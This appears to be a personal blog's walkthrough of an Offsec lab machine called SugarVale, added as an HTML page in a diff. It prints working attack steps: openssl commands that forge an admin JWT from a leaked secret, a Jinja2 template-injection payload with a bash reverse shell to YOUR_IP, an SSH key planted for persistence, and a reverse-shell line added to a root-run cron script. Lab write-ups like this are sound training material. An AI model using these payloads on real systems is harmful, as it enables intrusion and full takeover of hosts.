@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Offensive security writeup — penetration testing lab walkthrough.">
+    <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe, cybersecurity, ethical hacking">
+    <meta name="author" content="xlondra">
+    <meta name="robots" content="index, follow">
+    <title>Offsec - SugarVale - Walktrough — xlondra</title>
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+
+    <link rel="stylesheet" href="../../../assets/css/writeup.css">
+    <link rel="stylesheet" href="../../../assets/css/global.css">
+    <link rel="stylesheet" href="../../../assets/css/index.css">
+    <link rel="stylesheet" href="../../../assets/css/code.css">
+    <link rel="stylesheet" href="../../../assets/css/explain.css">
+
+    <script src="../../../assets/js/nav.js" defer></script>
+    <script src="../../../assets/js/footer.js" defer></script>
+    <script src="../../../assets/js/zoomer.js" defer></script>
+    <script src="../../../assets/js/writeup.js" defer></script>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali:~$&nbsp;</span>
+                <span class="typed"></span><span class="cursor">▋</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+                <a href="#" class="nav-exit">exit</a>
+            </div>
+            <div class="hamburger-button">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor">
+                    <path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/>
+                </svg>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="writeup">
+            <div class="lab-header">
+                <h1 class="lab-title">Offsec - SugarVale - Walktrough</h1>
+
+                <ul class="lab-meta">
+                    <li><strong>Date</strong> 2026-08-19</li>
+                    <li><strong>Platform</strong> Offsec</li>
+                    <li><strong>Difficulty</strong> Medium</li>
+                    <li><strong>Team</strong> <span class="team-badge red">Red Team</span></li>
+                    <li><strong>Link</strong> <a href="https://portal.offsec.com/machine/sugarvale-246565" target="_blank" rel="noopener noreferrer">Open Lab ↗</a></li>
+                    <li><strong>Tags</strong> <span class="tag">SSTI</span> <span class="tag">Linux</span> <span class="tag">SSH</span><span class="tag">Cron</span></li>
+                </ul>
+            </div>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Summary</h2>
+
+                <p>Scanning the target with nmap reveals two open ports: 22 (SSH) and 80 (HTTP). Enumerating the web server uncovers a backup folder containing everything needed to forge our own JSON Web Token and escalate to admin. As admin, we discover an input field vulnerable to server-side template injection (SSTI), which we leverage to open a reverse shell. After landing on the box, we stabilize the shell over SSH and identify a vulnerable cronjob that ultimately spawns a root shell on port 5555.</p>
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Enumeration</h2>
+
+                <p>Lets start enumerating the target with nmap:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="sudo nmap -p- -A -T4 TARGET_IP">└─$ sudo nmap -p- -A -T4 TARGET_IP</code></pre>
+</div>
+                <div class="command-wrapper output-block">
+    <div class="output-label">sudo nmap -p- -A -T4 192.168.187.220</div>
+    <pre><code data-copy-content="┌──(londra㉿kali)-[~]&#10;└─$ sudo nmap -p- -A -T4 192.168.187.220&#10;[sudo] password for londra:&#10;Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 01:02 +0200&#10;Nmap scan report for 192.168.187.220&#10;Host is up (0.031s latency).&#10;Not shown: 65533 closed tcp ports (reset)&#10;PORT   STATE SERVICE VERSION&#10;22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)&#10;| ssh-hostkey:&#10;|   256 96:e1:5a:30:60:4d:e2:e4:e6:07:33:20:bb:51:4d:a3 (ECDSA)&#10;|_  256 34:ec:9d:71:d3:65:c5:dd:df:8b:d0:5c:19:85:d6:e8 (ED25519)&#10;80/tcp open  http    nginx 1.24.0 (Ubuntu)&#10;|_http-server-header: nginx/1.24.0 (Ubuntu)&#10;|_http-title: SugarVale Sweets&#10;| http-robots.txt: 2 disallowed entries&#10;|_/admin /backups/&#10;No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).&#10;TCP/IP fingerprint:&#10;OS:SCAN(V=7.99%E=4%D=8/19%OT=22%CT=1%CU=34897%PV=Y%DS=4%DC=T%G=Y%TM=6A84E49&#10;OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ&#10;OS:(SP=102%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%&#10;OS:CI=Z%II=I%TS=A)SEQ(SP=FB%GCD=1%ISR=FD%TI=Z%CI=Z%TS=A)SEQ(SP=FE%GCD=1%ISR&#10;OS:=10C%TI=Z%CI=Z%TS=A)OPS(O1=M540ST11NW7%O2=M540ST11NW7%O3=M540NNT11NW7%O4&#10;OS:=M540ST11NW7%O5=M540ST11NW7%O6=M540ST11)WIN(W1=FEF4%W2=FEF4%W3=FEF4%W4=F&#10;OS:EF4%W5=FEF4%W6=FEF4)ECN(R=Y%DF=Y%T=40%W=FC00%O=M540NNSNW7%CC=Y%Q=)T1(R=Y&#10;OS:%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%&#10;OS:A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%&#10;OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=&#10;OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)&#10;&#10;Network Distance: 4 hops&#10;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#10;&#10;TRACEROUTE (using port 1723/tcp)&#10;HOP RTT      ADDRESS&#10;1   20.82 ms 192.168.45.1&#10;2   20.80 ms 192.168.45.254&#10;3   28.90 ms 192.168.251.1&#10;4   31.15 ms 192.168.187.220&#10;&#10;OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#10;Nmap done: 1 IP address (1 host up) scanned in 31.23 seconds">┌──(londra㉿kali)-[~]
+└─$ sudo nmap -p- -A -T4 192.168.187.220
+[sudo] password for londra:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 01:02 +0200
+Nmap scan report for 192.168.187.220
+Host is up (0.031s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 96:e1:5a:30:60:4d:e2:e4:e6:07:33:20:bb:51:4d:a3 (ECDSA)
+|_  256 34:ec:9d:71:d3:65:c5:dd:df:8b:d0:5c:19:85:d6:e8 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: SugarVale Sweets
+| http-robots.txt: 2 disallowed entries
+|_/admin /backups/
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.99%E=4%D=8/19%OT=22%CT=1%CU=34897%PV=Y%DS=4%DC=T%G=Y%TM=6A84E49
+OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=102%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%
+OS:CI=Z%II=I%TS=A)SEQ(SP=FB%GCD=1%ISR=FD%TI=Z%CI=Z%TS=A)SEQ(SP=FE%GCD=1%ISR
+OS:=10C%TI=Z%CI=Z%TS=A)OPS(O1=M540ST11NW7%O2=M540ST11NW7%O3=M540NNT11NW7%O4
+OS:=M540ST11NW7%O5=M540ST11NW7%O6=M540ST11)WIN(W1=FEF4%W2=FEF4%W3=FEF4%W4=F
+OS:EF4%W5=FEF4%W6=FEF4)ECN(R=Y%DF=Y%T=40%W=FC00%O=M540NNSNW7%CC=Y%Q=)T1(R=Y
+OS:%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%
+OS:A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%
+OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=
+OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1723/tcp)
+HOP RTT      ADDRESS
+1   20.82 ms 192.168.45.1
+2   20.80 ms 192.168.45.254
+3   28.90 ms 192.168.251.1
+4   31.15 ms 192.168.187.220
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.23 seconds</code></pre>
+</div>
+                <p>Nmap shows two open ports: 22 (SSH) & 80 (HTTP).
+
+Interestingly, nmap shows us that the Admin & Backup folders are both excluded from indexation. Lets try to access them.</p>
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Reconnaissance</h2>
+
+                <p>The admin page appears to be a dedicated login portal reserved for administrators.</p>
+                <img src="images/adminpage.png" class="lab-image zoomable" alt="">
+                <p>The backups page, however, has two interesting files:</p>
+                <img src="images/backups.png" class="lab-image zoomable" alt="">
+                <p>Opening both <b>env</b> and <b>config.json</b> reveals all the necessary information to forge a JWT<br> (<b>J</b>SON <b>W</b>eb <b>T</b>oken).</p>
+                <img src="images/AllSecrets.png" class="lab-image zoomable" alt="">
+                <p>If we create an account, our JWT is stored in a cookie called <b>sv_token</b>. Copying the cookie and inspecting its value shows three base64url-encoded chunks joined by dots:</p>
+                <p>Chunk 1: <b>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</b>
+<br>Content: <span class='path'>{"alg":"HS256","typ":"JWT"}</span></p>
+                <p>Chunk 2: <b>eyJzdWIiOiJsb25kcmEiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4NzA5OTUxOX0</b><br>
+Content: <span class='path'>{"sub":"londra","role":"user","iat":1787099519}</span></p>
+                <p>Chunk 3 consists of 32 raw bytes of HMAC-SHA256 output as expected for SHA-256, which is not important now.</p>
+                <p>We are actually able to forge our own admin JWT with the information we possess at the moment.
+We can do so by executing the following commands in order:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="header=$(echo -n '{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}' | base64 | tr '+/' '-_' | tr -d '=')">└─$ header=$(echo -n '{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}' | base64 | tr '+/' '-_' | tr -d '=')</code></pre>
+</div>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="payload=$(echo -n '{&quot;sub&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;iat&quot;:YOUR_IAT}' | base64 | tr '+/' '-_' | tr -d '=')">└─$ payload=$(echo -n '{&quot;sub&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;iat&quot;:YOUR_IAT}' | base64 | tr '+/' '-_' | tr -d '=')</code></pre>
+</div>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="sig=$(echo -n &quot;${header}.${payload}&quot; | openssl dgst -sha256 -hmac 'sweetsauce' -binary | base64 | tr '+/' '-_' | tr -d '=')">└─$ sig=$(echo -n &quot;${header}.${payload}&quot; | openssl dgst -sha256 -hmac 'sweetsauce' -binary | base64 | tr '+/' '-_' | tr -d '=')</code></pre>
+</div>
+                <p>And the last command to actually concatenate all base64 values:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="echo &quot;${header}.${payload}.${sig}&quot;">└─$ echo &quot;${header}.${payload}.${sig}&quot;</code></pre>
+</div>
+                <p>Now, if we copy that forged token and swap it in for the current value of the sv_token cookie (assuming we're logged in), we become admin. Refreshing the page, /admin is now accessible.</p>
+                <img src="images/adminDashboard.png" class="lab-image zoomable" alt="">
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Exploitation</h2>
+
+                <p>The admin page exposes an input field.
+There is a high probability that the data we're submitting there is actually being handled by a server.<br> Note how I use "a" instead of "the", since I am not yet sure what back-end is running at the moment. Therefore I tried some SSTI techniques. First for PHP, then Java, and ultimately... Python:</p>
+                <img src="images/SSTIWorks.png" class="lab-image zoomable" alt="">
+                <p>As you can see, the command "<b>ls</b>" is executed when the following payload is submitted:</p>
+                <p><code>name={{config.__class__.__init__.__globals__['os'].popen('ls').read()}},/code></code></p>
+                <p>Now lets start a netcat listener on port 4444 and submit the following SSTI payload:</p>
+                <p><code>name={{config.__class__.__init__.__globals__['os'].popen("bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'").read()}},/code></code></p>
+                <p>We receive a reverse shell upon submission and are able to extract the first flag:</p>
+                <img src="images/revshell.png" class="lab-image zoomable" alt="">
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Post-Exploitation</h2>
+
+                <p>Next, lets stabalize our shell by opening an ssh connection. On our attacking machine we execute the following:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="ssh-keygen -t ed25519 -f ./svc_key -N &quot;&quot;">└─$ ssh-keygen -t ed25519 -f ./svc_key -N &quot;&quot;</code></pre>
+</div>
+                <p>Extract the public key:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="cat svc_key.pub">└─$ cat svc_key.pub</code></pre>
+</div>
+                <p>Now on the target:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="cd ~ &amp;&amp; mkdir .ssh &amp;&amp; echo &quot;PUBLIC_KEY_CONTENT&quot; &gt; .ssh/authorized_keys ">└─$ cd ~ &amp;&amp; mkdir .ssh &amp;&amp; echo &quot;PUBLIC_KEY_CONTENT&quot; &gt; .ssh/authorized_keys </code></pre>
+</div>
+                <p>Now on our attacker machine, we can execute the following command to open the SSH connection:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="ssh -i svc_key appsvc@TARGET_IP">└─$ ssh -i svc_key appsvc@TARGET_IP</code></pre>
+</div>
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Privilege Escalation</h2>
+
+                <p>The next goal is to become root. Checking all cronjobs reveals interesting information: </p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="ls -lah /etc/cron*">└─$ ls -lah /etc/cron*</code></pre>
+</div>
+                <p>It reveals a cronjob owned by root:</p>
+                <img src="images/ledger_backup.png" class="lab-image zoomable" alt="">
+                <p>The "<b>file</b>" command reveals that we're dealing with a shell script:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="file /etc/cron.d/ledger-backup">└─$ file /etc/cron.d/ledger-backup</code></pre>
+</div>
+                <img src="images/itsASCII.png" class="lab-image zoomable" alt="">
+                <p>It seems to be executing <span class='path'>/usr/local/sbin/ledger-backup</span></p>
+                <img src="images/whatanotherone.png" class="lab-image zoomable" alt="">
+                <p><b>/usr/local/sbin/ledger-backup</b> points to yet another file which executes the content of another file:</p>
+                <img src="images/whatwhatAnotherPoint.png" class="lab-image zoomable" alt="">
+                <p>Now, /opt/ledger/backup/logrotate.sh is writable by our user and executed as root.</p>
+                <img src="images/finalyThelastOne.png" class="lab-image zoomable" alt="">
+                <p>We can thus add the following line to the file:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="bash -c 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/5555 0&gt;&amp;1'">└─$ bash -c 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/5555 0&gt;&amp;1'</code></pre>
+</div>
+                <img src="images/toBecomeRoot.png" class="lab-image zoomable" alt="">
+                <p>Start a netcat listener on port 5555 and save the file. This will open up a root shell and thus allows us to read the root flag:</p>
+                <img src="images/AndWeWere.png" class="lab-image zoomable" alt="">
+                <p>I hope you learned something new today! Have a nice rest of your day.</p>
+            </section>
+        </article>
+    </main>
+
+    <footer>
+        Copyleft &copy; <span id="year"></span> &nbsp;·&nbsp; xlondra
+    </footer>
+</body>
+</html>
